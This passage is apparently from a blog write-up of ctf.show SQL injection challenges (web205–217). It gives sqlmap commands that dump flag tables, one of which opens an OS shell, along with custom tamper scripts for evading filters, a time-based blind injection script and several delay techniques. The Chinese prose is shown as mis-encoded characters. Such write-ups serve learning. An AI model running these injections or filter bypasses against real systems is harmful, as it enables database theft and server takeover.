class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http://<span class="number">9982</span>c70a-d4b0-<span class="number">45</span>f1-b247-<span class="number">871</span>e538c14b0.challenge.ctf.show/api/index.php --method=PUT --headers=&quot;Content-<span class="built_in">Type</span>: text/plain&quot; --data=&quot;id=<span class="number">1</span>&quot; --refer=ctf.show --safe-url=<span class="number">9982</span>c70a-d4b0-<span class="number">45</span>f1-b247-<span class="number">871</span>e538c14b0.challenge.ctf.show/api/getToken.php --safe-freq=<span class="number">1</span> --current-db --tables -T ctfshow_flax --columns -C flagx --dump</span><br></pre></td></tr></table></figure><h4><span id="web206">web206</span></h4><p>å¯ä»¥æé«˜levelç­‰çº§ï¼Œæé«˜levelå°±ä¼šæ‰§è¡Œæ›´å¤šçš„payload,åŒæ—¶æ‰§è¡Œé€Ÿåº¦ä¹Ÿä¼šå˜æ…¢(è¿™é¢˜å…¶å®ä¸éœ€è¦)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--level=LEVEL è®¾ç½®æµ‹è¯•ç­‰çº§ï¼ˆ1-5ï¼Œé»˜è®¤ä¸º 1ï¼‰</span><br></pre></td></tr></table></figure><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http://e1e4b812-<span class="number">10</span>a3-<span class="number">4</span>fdf-<span class="number">991</span>a-<span class="number">405337841416</span>.challenge.ctf.show/api/index.php --method=PUT --headers=&quot;Content-<span class="built_in">Type</span>: text/plain&quot; --data=&quot;id=<span class="number">1</span>&quot; --refer=ctf.show --safe-url=http://e1e4b812-<span class="number">10</span>a3-<span class="number">4</span>fdf-<span class="number">991</span>a-<span class="number">405337841416</span>.challenge.ctf.show/api/getToken.php --safe-freq=<span class="number">1</span> --current-db --tables -T ctfshow_flaxc -C flagv --dump --level=<span class="number">3</span></span><br></pre></td></tr></table></figure><h4><span id="web207">web207</span></h4><p>è¿‡æ»¤äº†ç©ºæ ¼,å¯ä»¥ç”¨<code>--tamper</code>æ¥ä¿®æ”¹æ³¨å…¥çš„æ•°æ®</p><p><a href="https://blog.csdn.net/qq_34444097/article/details/82717357">å¸¸è§çš„tamperè„šæœ¬</a></p><blockquote><p>space2comment.pyç”¨&#x2F;**&#x2F;ä»£æ›¿ç©ºæ ¼</p><p>apostrophemask.pyç”¨utf8ä»£æ›¿å¼•å·</p><p>equaltolike.pylikeä»£æ›¿ç­‰å·</p><p>space2dash.pyã€€ç»•è¿‡è¿‡æ»¤â€˜&#x3D;â€™ æ›¿æ¢ç©ºæ ¼å­—ç¬¦ï¼ˆâ€ï¼‰ï¼Œï¼ˆâ€™â€“â€˜ï¼‰åè·Ÿä¸€ä¸ªç ´æŠ˜å·æ³¨é‡Šï¼Œä¸€ä¸ªéšæœºå­—ç¬¦ä¸²å’Œä¸€ä¸ªæ–°è¡Œï¼ˆâ€™nâ€™ï¼‰</p><p>greatest.pyã€€ç»•è¿‡è¿‡æ»¤â€™&gt;â€™ ,ç”¨GREATESTæ›¿æ¢å¤§äºå·ã€‚</p><p>space2hash.pyç©ºæ ¼æ›¿æ¢ä¸º#å·,éšæœºå­—ç¬¦ä¸²ä»¥åŠæ¢è¡Œç¬¦</p><p>apostrophenullencode.pyç»•è¿‡è¿‡æ»¤åŒå¼•å·ï¼Œæ›¿æ¢å­—ç¬¦å’ŒåŒå¼•å·ã€‚</p><p>halfversionedmorekeywords.pyå½“æ•°æ®åº“ä¸ºmysqlæ—¶ç»•è¿‡é˜²ç«å¢™ï¼Œæ¯ä¸ªå…³é”®å­—ä¹‹å‰æ·»åŠ mysqlç‰ˆæœ¬è¯„è®º</p><p>space2morehash.pyç©ºæ ¼æ›¿æ¢ä¸º #å· ä»¥åŠæ›´å¤šéšæœºå­—ç¬¦ä¸² æ¢è¡Œç¬¦</p><p>appendnullbyte.pyåœ¨æœ‰æ•ˆè´Ÿè·ç»“æŸä½ç½®åŠ è½½é›¶å­—èŠ‚å­—ç¬¦ç¼–ç </p><p>ifnull2ifisnull.pyã€€ç»•è¿‡å¯¹IFNULLè¿‡æ»¤,æ›¿æ¢ç±»ä¼¼â€™IFNULL(A,B)â€™ä¸ºâ€™IF(ISNULL(A), B, A)â€™</p><p>space2mssqlblank.py(mssql)ç©ºæ ¼æ›¿æ¢ä¸ºå…¶å®ƒç©ºç¬¦å·</p><p>base64encode.pyã€€ç”¨base64ç¼–ç æ›¿æ¢</p><p>space2mssqlhash.pyã€€æ›¿æ¢ç©ºæ ¼</p><p>modsecurityversioned.pyè¿‡æ»¤ç©ºæ ¼ï¼ŒåŒ…å«å®Œæ•´çš„æŸ¥è¯¢ç‰ˆæœ¬æ³¨é‡Š</p><p>space2mysqlblank.pyã€€ç©ºæ ¼æ›¿æ¢å…¶å®ƒç©ºç™½ç¬¦å·(mysql)</p><p>between.pyç”¨betweenæ›¿æ¢å¤§äºå·ï¼ˆ&gt;ï¼‰</p><p>space2mysqldash.pyæ›¿æ¢ç©ºæ ¼å­—ç¬¦ï¼ˆâ€ï¼‰ï¼ˆâ€™ â€“ â€˜ï¼‰åè·Ÿä¸€ä¸ªç ´æŠ˜å·æ³¨é‡Šä¸€ä¸ªæ–°è¡Œï¼ˆâ€™ nâ€™ï¼‰</p><p>multiplespaces.pyå›´ç»•SQLå…³é”®å­—æ·»åŠ å¤šä¸ªç©ºæ ¼</p><p>space2plus.pyç”¨+æ›¿æ¢ç©ºæ ¼</p><p>bluecoat.pyä»£æ›¿ç©ºæ ¼å­—ç¬¦åä¸ä¸€ä¸ªæœ‰æ•ˆçš„éšæœºç©ºç™½å­—ç¬¦çš„SQLè¯­å¥,ç„¶åæ›¿æ¢&#x3D;ä¸ºlike</p><p>nonrecursivereplacement.pyåŒé‡æŸ¥è¯¢è¯­å¥,å–ä»£SQLå…³é”®å­—</p><p>space2randomblank.pyä»£æ›¿ç©ºæ ¼å­—ç¬¦ï¼ˆâ€œâ€ï¼‰ä»ä¸€ä¸ªéšæœºçš„ç©ºç™½å­—ç¬¦å¯é€‰å­—ç¬¦çš„æœ‰æ•ˆé›†</p><p>sp_password.pyè¿½åŠ sp_passwordâ€™ä»DBMSæ—¥å¿—çš„è‡ªåŠ¨æ¨¡ç³Šå¤„ç†çš„æœ‰æ•ˆè½½è·çš„æœ«å°¾</p><p>chardoubleencode.pyåŒurlç¼–ç (ä¸å¤„ç†ä»¥ç¼–ç çš„)</p><p>unionalltounion.pyæ›¿æ¢UNION ALLSELECT UNION SELECT</p><p>charencode.pyã€€urlç¼–ç </p><p>randomcase.pyéšæœºå¤§å°å†™</p><p>unmagicquotes.pyå®½å­—ç¬¦ç»•è¿‡ GPCaddslashes</p><p>randomcomments.pyç”¨&#x2F;**&#x2F;åˆ†å‰²sqlå…³é”®å­—</p><p>charunicodeencode.pyå­—ç¬¦ä¸² unicode ç¼–ç </p><p>securesphere.pyè¿½åŠ ç‰¹åˆ¶çš„å­—ç¬¦ä¸²</p><p>versionedmorekeywords.pyæ³¨é‡Šç»•è¿‡</p><p>space2comment.pyæ›¿æ¢ç©ºæ ¼å­—ç¬¦ä¸²(â€˜â€˜) ä½¿ç”¨æ³¨é‡Šâ€˜&#x2F;**&#x2F;â€™</p><p>halfversionedmorekeywords.pyå…³é”®å­—å‰åŠ æ³¨é‡Š</p></blockquote><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http://<span class="number">04</span>a724c7-<span class="number">1</span>a0c-<span class="number">4124</span>-b6f5-<span class="number">99</span>d2ed8f4899.challenge.ctf.show/api/index.php --safe-url=http://<span class="number">04</span>a724c7-<span class="number">1</span>a0c-<span class="number">4124</span>-b6f5-<span class="number">99</span>d2ed8f4899.challenge.ctf.show/api/getToken.php --safe-freq=<span class="number">1</span> -method=PUT --headers=&quot;Content-<span class="built_in">Type</span>: text/plain&quot; --data=&quot;id=<span class="number">1</span>&quot; --dbms=mysql --current-db --tables  -T ctfshow_flaxca  --columns -C flagvc --dump  --level=<span class="number">3</span> --tamper=space2comment</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4><span id="web-207">web 207</span></h4><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://<span class="number">103309</span>c4-<span class="number">1619</span>-<span class="number">45</span>a2-<span class="number">84</span>ec-<span class="number">56</span>b906282010.challenge.ctf.show/api/index.php&quot; --method=&quot;PUT&quot; --data=&quot;id=<span class="number">1</span>&quot; --referer=ctf.show --headers=&quot;Content-<span class="built_in">Type</span>: text/plain&quot; --cookie=&quot;PHPSESSID=<span class="number">1</span>vrv4fg7q4uid8i1lhma043h20&quot; --safe-url=&quot;http://<span class="number">103309</span>c4-<span class="number">1619</span>-<span class="number">45</span>a2-<span class="number">84</span>ec-<span class="number">56</span>b906282010.challenge.ctf.show/api/getToken.php&quot; --safe-freq=<span class="number">1</span> --tamper=space2comment.py,uppercase.py -D ctfshow_web -T ctfshow_flaxcac -C flagvca --dump</span><br></pre></td></tr></table></figure><h4><span id="web209">Web209</span></h4><p><a href="https://y4er.com/posts/sqlmap-tamper/">è‡ªå®šä¹‰tamper</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    @Author disda</span></span><br><span class="line"><span class="string">    @Date 2023/6/6 10:07</span></span><br><span class="line"><span class="string">    @Describe </span></span><br><span class="line"><span class="string">    @Dependency</span></span><br><span class="line"><span class="string">    @Version 1.0</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Copyright (c) 2006-2021 sqlmap developers (http://sqlmap.org/)</span></span><br><span class="line"><span class="string">See the file &#x27;LICENSE&#x27; for copying permission</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.compat <span class="keyword">import</span> xrange</span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dependencies</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload, **kwargs</span>):</span><br><span class="line"></span><br><span class="line">    retVal = payload</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> payload:</span><br><span class="line">        retVal = <span class="string">&quot;&quot;</span></span><br><span class="line">        quote, doublequote, firstspace = <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="built_in">len</span>(payload)):</span><br><span class="line">            <span class="comment"># å¦‚æœæ˜¯ç¬¬ä¸€ä¸ªç©ºæ ¼ï¼Œå°±è¿›è¡Œæ›¿æ¢</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> firstspace:</span><br><span class="line">                <span class="keyword">if</span> payload[i].isspace():</span><br><span class="line">                    firstspace = <span class="literal">True</span></span><br><span class="line">                    retVal += <span class="built_in">chr</span>(<span class="number">0x9</span>)</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">            <span class="comment"># å¦‚æœåˆ¤æ–­æ˜¯åœ¨å¼•å·çš„å†…éƒ¨ï¼Œä¸ç®¡æ˜¯å•è¿˜æ˜¯åŒï¼Œéƒ½ä¸æ›¿æ¢</span></span><br><span class="line">            <span class="keyword">elif</span> payload[i] == <span class="string">&#x27;\&#x27;&#x27;</span>:</span><br><span class="line">                quote = <span class="keyword">not</span> quote</span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> payload[i] == <span class="string">&#x27;&quot;&#x27;</span>:</span><br><span class="line">                doublequote = <span class="keyword">not</span> doublequote</span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> payload[i] == <span class="string">&#x27;=&#x27;</span>:</span><br><span class="line">                retVal += <span class="built_in">chr</span>(<span class="number">0x9</span>) + <span class="string">&#x27;like&#x27;</span> + <span class="built_in">chr</span>(<span class="number">0x9</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> payload[i] == <span class="string">&quot; &quot;</span> <span class="keyword">and</span> <span class="keyword">not</span> doublequote <span class="keyword">and</span> <span class="keyword">not</span> quote:</span><br><span class="line">                retVal += <span class="built_in">chr</span>(<span class="number">0x9</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            retVal += payload[i]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> retVal</span><br></pre></td></tr></table></figure><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://<span class="number">0407</span>dae4-c9af-<span class="number">4418</span>-<span class="number">8</span>e92-bb043a3f33d8.challenge.ctf.show/api/index.php&quot; --method=&quot;PUT&quot; --data=&quot;id=<span class="number">1</span>&quot; --referer=ctf.show --headers=&quot;Content-<span class="built_in">Type</span>: text/plain&quot; --safe-url=&quot;http://<span class="number">0407</span>dae4-c9af-<span class="number">4418</span>-<span class="number">8</span>e92-bb043a3f33d8.challenge.ctf.show/api/getToken.php&quot; --safe-freq=<span class="number">1</span> --tamper=web209.py -T ctfshow_flav -C ctfshow_flagx --dump</span><br></pre></td></tr></table></figure><h4><span id="web210">web210</span></h4><p>è¿”å›é€»è¾‘</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//å¯¹æŸ¥è¯¢å­—ç¬¦è¿›è¡Œè§£å¯†</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">decode</span>(<span class="params"><span class="variable">$id</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">strrev</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">strrev</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$id</span>))));</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>åå‘æ“ä½œå³å¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> lib.core.compat <span class="keyword">import</span> xrange</span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dependencies</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload, **kwargs</span>):</span><br><span class="line">    retVal = payload</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> payload:</span><br><span class="line">        retVal = retVal.encode()</span><br><span class="line">        retVal = retVal[::-<span class="number">1</span>]</span><br><span class="line">        retVal = base64.b64encode(retVal)</span><br><span class="line">        retVal = retVal[::-<span class="number">1</span>]</span><br><span class="line">        retVal = base64.b64encode(retVal)</span><br><span class="line">        retVal = retVal.decode()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> retVal</span><br></pre></td></tr></table></figure><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://<span class="number">3</span>b91408c-<span class="number">21</span>f5-<span class="number">4</span>fb0-<span class="number">9</span>cf4-<span class="number">73438</span>accb280.challenge.ctf.show/api/index.php&quot; --method=&quot;PUT&quot; --data=&quot;id=<span class="number">1</span>&quot; --referer=ctf.show --headers=&quot;Content-<span class="built_in">Type</span>: text/plain&quot; --safe-url=&quot;http://<span class="number">3</span>b91408c-<span class="number">21</span>f5-<span class="number">4</span>fb0-<span class="number">9</span>cf4-<span class="number">73438</span>accb280.challenge.ctf.show/api/getToken.php&quot; --safe-freq=<span class="number">1</span> --tamper=web210.py -T ctfshow_flavi -C ctfshow_flagxx --dump</span><br></pre></td></tr></table></figure><h4><span id="web212">Web212</span></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"><span class="keyword">from</span> lib.core.common <span class="keyword">import</span> singleTimeWarnMessage</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dependencies</span>():</span><br><span class="line">    singleTimeWarnMessage(<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload, **kwargs</span>):</span><br><span class="line">    payload = bypass(payload)</span><br><span class="line"></span><br><span class="line">    retVal = payload</span><br><span class="line">    retVal = retVal.encode()</span><br><span class="line">    retVal = retVal[::-<span class="number">1</span>]</span><br><span class="line">    retVal = base64.b64encode(retVal)</span><br><span class="line">    retVal = retVal[::-<span class="number">1</span>]</span><br><span class="line">    retVal = base64.b64encode(retVal)</span><br><span class="line">    retVal = retVal.decode()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> retVal</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bypass</span>(<span class="params">payload</span>):</span><br><span class="line">    retVal = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(payload)):</span><br><span class="line">        <span class="keyword">if</span> payload[i]==<span class="string">&quot; &quot;</span>:</span><br><span class="line">            retVal += <span class="built_in">chr</span>(<span class="number">0x9</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            retVal += payload[i]</span><br><span class="line">    <span class="keyword">return</span> retVal</span><br></pre></td></tr></table></figure><h4><span id="web213">web213</span></h4><ul><li>é¢˜ç›®æç¤ºos-shell</li></ul><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://<span class="number">4</span>ee86282-<span class="number">6952</span>-<span class="number">4</span>b4f-a276-f268fe18746a.challenge.ctf.show/api/index.php&quot; --method=&quot;PUT&quot; --data=&quot;id=<span class="number">1</span>&quot; --referer=ctf.show --headers=&quot;Content-<span class="built_in">Type</span>: text/plain&quot; --safe-url=&quot;http://<span class="number">4</span>ee86282-<span class="number">6952</span>-<span class="number">4</span>b4f-a276-f268fe18746a.challenge.ctf.show/api/getToken.php&quot; --safe-freq=<span class="number">1</span> --tamper=web210.py --os-shell --batch</span><br></pre></td></tr></table></figure><h4><span id="web214">web214</span></h4><p>æ—¶é—´ç›²æ³¨ï¼Œå†™è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># @Author:Kradress</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://a02805db-8d38-44d6-b782-6194092b9a45.challenge.ctf.show//api/&quot;</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># çˆ†è¡¨å</span></span><br><span class="line"><span class="comment"># payload = &quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&quot;</span></span><br><span class="line"><span class="comment"># çˆ†åˆ—å</span></span><br><span class="line"><span class="comment"># payload = &quot;select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;ctfshow_flagx&#x27;&quot;</span></span><br><span class="line"><span class="comment">#çˆ†å­—æ®µå€¼</span></span><br><span class="line">payload = <span class="string">&quot;select flaga from `ctfshow_flagx`&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="comment"># 32-127æ˜¯å¯æ˜¾ç¤ºçš„ASCIIç </span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span> <span class="comment"># ä¸­é—´æŒ‡é’ˆç­‰äºå¤´å°¾æŒ‡é’ˆç›¸åŠ çš„ä¸€åŠ</span></span><br><span class="line">        <span class="comment"># print(mid)</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;ip&#x27;</span> : <span class="string">f&quot;if(ascii(substr((<span class="subst">&#123;payload&#125;</span>),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,sleep(3),1)#&quot;</span>,</span><br><span class="line">            <span class="string">&#x27;debug&#x27;</span> : <span class="string">&#x27;0&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.post(url, data, timeout=<span class="number">0.8</span>)</span><br><span class="line">            tail = mid</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            head = mid + <span class="number">1</span> <span class="comment">#sleepå¯¼è‡´è¶…æ—¶</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        result += <span class="built_in">chr</span>(head)</span><br><span class="line">        <span class="built_in">print</span>(result)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h4><span id="web-215">web 215</span></h4><ul><li><p>ä»æ•°å­—ç±»å‹çš„å‚æ•°å˜æˆå­—ç¬¦ä¸²ç±»å‹å‚æ•°</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&#x27; or if(ascii(substr((&#123;payload&#125;),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(3),1)#&quot;</span></span><br></pre></td></tr></table></figure></li></ul><h4><span id="web-216">web 216</span></h4><ul><li><p>é—­åˆ<code>)</code>å³å¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;1) or if(ascii(substr((&#123;payload&#125;),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(3),1)#&quot;</span></span><br></pre></td></tr></table></figure></li></ul><h4><span id="web-217">web 217</span></h4><p><a href="https://www.cnblogs.com/-qing-/p/10894310.html">sleepå¹³æ›¿æ³•</a></p><p><strong>benchmark</strong></p><blockquote><p>benchmark #å¯ä»¥æµ‹è¯•æŸäº›ç‰¹å®šæ“ä½œçš„æ‰§è¡Œé€Ÿåº¦ã€‚å‚æ•°å¯ä»¥æ˜¯éœ€è¦æ‰§è¡Œçš„æ¬¡æ•°å’Œè¡¨è¾¾å¼ã€‚</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select benchmark(1e7,sha1(&#x27;kradress&#x27;)); # 2.24s  </span><br><span class="line">select benchmark(1e7*(1=1),sha1(&#x27;kradress&#x27;)) #2.57s</span><br><span class="line">select benchmark(1e7*(1=2),sha1(&#x27;kradress&#x27;)) #0s</span><br></pre></td></tr></table></figure><p><strong>ç¬›å¡å°”ç§¯</strong></p><blockquote><p>è¿™ç§æ–¹æ³•åˆå«åšheavy query,å¯ä»¥é€šè¿‡é€‰å®šä¸€ä¸ªå¤§è¡¨æ¥åšç¬›å¡å„¿ç§¯ï¼Œä½†è¿™ç§æ–¹å¼æ‰§è¡Œæ—¶é—´ä¼šå‡ ä½•å€æ•°çš„æå‡ï¼Œåœ¨ç«™æ¯”è¾ƒå¤§çš„æƒ…å†µä¸‹ä¼šé€ æˆå‡ ä½•å€æ•°çš„æ•ˆæœï¼Œå®é™…åˆ©ç”¨èµ·æ¥éå¸¸ä¸å¥½ç”¨</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-- å¯ä»¥ä»£æ›¿sleep</span><br><span class="line">select if(1=1,(select count(*) from information_schema.columns A, information_schema.columns B,information_schema.columns C),0);</span><br></pre></td></tr></table></figure><p><strong>æ­£åˆ™è¡¨è¾¾å¼</strong></p><blockquote><p>æ­£ä¾§åŒ¹é…åœ¨åŒ¹é…è¾ƒé•¿å­—ç¬¦ä¸²ä½†è‡ªç”±åº¦æ¯”è¾ƒé«˜çš„å­—ç¬¦ä¸²æ—¶ä¼šé€ æˆæ¯”è¾ƒå¤§çš„è®¡ç®—é‡ï¼Œæˆ‘ä»¬é€šè¿‡rpadæˆ–repeatæ„é€ é•¿å­—ç¬¦ä¸²ï¼ŒåŠ ä»¥è®¡ç®—é‡å¤§çš„pattern,é€šè¿‡æ§åˆ¶å­—ç¬¦ä¸²é•¿åº¦æˆ‘ä»¬å¯ä»¥æ§åˆ¶å»¶æ—¶</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT if(1=1,(select rpad(&#x27;a&#x27;,4999999,&#x27;a&#x27;) RLIKE concat(repeat(&#x27;(a.*)+&#x27;,30),&#x27;b&#x27;)),0)</span><br><span 